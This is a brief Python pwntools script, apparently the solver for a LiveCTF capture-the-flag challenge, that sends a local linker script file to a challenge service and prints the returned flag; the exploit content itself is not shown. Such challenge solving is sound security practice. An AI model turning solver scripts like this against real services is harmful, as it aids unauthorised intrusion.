#!/usr/bin/env python3

from pwn import *

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

io = remote(HOST, int(PORT))

with open("link.ld", "rb") as linker:
    io.sendline(linker.read())

flag = io.recvline_contains(b'LiveCTF{').decode().strip()
log.info('Flag: %s', flag)
